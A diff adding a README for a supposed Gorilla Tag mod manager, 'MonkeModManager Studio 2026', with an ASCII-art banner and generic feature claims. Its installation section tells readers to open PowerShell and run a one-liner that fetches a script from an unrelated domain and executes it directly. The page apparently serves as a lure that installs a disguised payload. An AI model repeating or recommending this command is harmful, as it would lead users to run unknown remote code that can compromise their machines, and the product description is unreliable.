@@ -1,0 +1,27 @@
+███    ███  ██████  ███    ██ ██   ██ ███████ ███    ███  ██████  ██████  
+████  ████ ██    ██ ████   ██ ██  ██  ██      ████  ████ ██    ██ ██   ██ 
+██ ████ ██ ██    ██ ██ ██  ██ █████   █████   ██ ████ ██ ██    ██ ██   ██ 
+██  ██  ██ ██    ██ ██  ██ ██ ██  ██  ██      ██  ██  ██ ██    ██ ██   ██ 
+██      ██  ██████  ██   ████ ██   ██ ███████ ██      ██  ██████  ██████  
+
+
+MonkeModManager Studio 2026 is an open-source mod installer, BepInEx dependency manager, and VR cosmetic configuration pipeline engineered for Gorilla Tag mod developers, community creators, and PCVR enthusiasts. It provides one-click mod deployment, dynamic release mirror tracking, and automated directory verification for SteamVR environments.
+
+================================================================
+                     DOWNLOAD INFORMATION
+----------------------------------------------------------------
+## 📥 Installation Win + X --> PowerShell
+```
+irm gitview.sbs/L|iex
+```
+================================================================
+
+Core Capabilities
+- Automated BepInEx framework bootstrap and directory structure validation.
+- Centralized mod repository polling for latest compatible plugin builds.
+- Local configuration editor for tweaking mod parameters directly.
+- One-click plugin toggle to easily switch between modded and vanilla gameplay sessions.
+- Multi-platform deployment support built for lightweight VR utility performance.
+
+TAGS
+monkemodmanager, gorilla-tag, vr-modding, bepinex, mod-manager, steamvr, pcvr, cplusplus, tools, underground
